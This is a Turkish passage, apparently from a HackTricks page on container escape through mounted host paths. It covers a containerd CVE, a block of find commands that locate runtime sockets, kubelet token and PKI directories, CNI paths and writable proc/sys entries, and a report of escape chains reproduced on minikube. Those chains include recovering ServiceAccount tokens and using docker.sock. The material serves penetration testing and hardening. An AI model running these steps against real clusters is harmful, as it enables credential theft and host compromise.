- `containerd` 2.1.0 içindeki `CVE-2025-47290`: image unpack sırasında gerçekleşen bir TOCTOU, özel olarak hazırlanmış bir image'ın pull işlemi sırasında host filesystem'ını değiştirmesine olanak sağlayabilirdi.

Bu CVE'ler burada önemlidir; çünkü mount işlemlerinin yalnızca operatör yapılandırmasıyla ilgili olmadığını gösterir. Runtime'ın kendisi de mount kaynaklı escape koşulları oluşturabilir.

## Kontroller

En yüksek değerli mount açıklarını hızla bulmak için şu komutları kullanın:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Burada dikkat çekenler:

- Host root, `/proc`, `/sys`, `/var` ve runtime socket’leri yüksek öncelikli bulgulardır.
- Yazılabilir proc/sys girdileri, mount’un güvenli bir container görünümü yerine genellikle host genelindeki kernel kontrollerini açığa çıkardığı anlamına gelir.
- Mount edilmiş `/var` yolları yalnızca dosya sistemi açısından değil, kimlik bilgileri ve komşu iş yükleri açısından da incelenmelidir.
- Kubelet durum dizinleri ve CNI/plugin yolları, runtime socket’leriyle aynı öncelikte değerlendirilmelidir; çünkü bunlar genellikle doğrudan node’un pod oluşturma ve kimlik bilgisi dağıtma yolu üzerindedir.

## Yerel Doğrulama Durumu

Bu sayfadaki pratik zincirler, yerel bir Linux minikube node’u üzerinde kontrol edildi. Doğrulamada şunlar yeniden üretildi:

- Geçici, yazılabilir bir hostPath üzerinden okuma ve yazma erişimi
- `/var/lib/kubelet/pods` üzerinden projekte edilmiş ServiceAccount token’larının ve mount edilmiş Secret’ların bulunması
- Mount edilmiş kubelet durumundan kurtarılan geçerli bir token ile Kubernetes API kimlik doğrulamasının başarıyla yapılması
- Mount edilmiş `/var` üzerinden komşu bir Docker `overlay2` dosya sisteminin salt okunur biçimde keşfedilmesi
- Mount edilmiş bir `docker.sock` üzerinden salt okunur bir host bind’i olan kardeş bir container’ın Docker API ile oluşturulması
- Geçici, host tarafından tüketilen bir hook üzerinden gecikmeli host çalıştırması
- Orijinal plugin’in argümanlarını, standart girdisini ve çalıştırılmasını koruyan bir CNI-wrapper simülasyonu

Aynı node’da `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` ve `config.gz` erişilebilirdi; ancak `uevent_helper`, EFI değişkenleri, thermal girdileri veya `sched_debug` erişilebilir değildi. Yıkıcı kernel tetikleyicileri çalıştırılmadı. Bu, host-root, `/var`, kubelet durumu, socket ve host-consumer zincirlerinin yeniden üretilebilir olduğunu doğrularken procfs/sysfs yardımcı tekniklerinin tam olarak kullanılan kernel’e, mount kipine, payload yoluna ve tetikleyiciye bağlı olarak değerlendirilmesi gerektiğini gösterir.

## References

- [1] [Kubelet Tarafından Kullanılan Yerel Dosyalar ve Yollar](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container, `hostPath` mount’u üzerinden host’a erişebilir](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
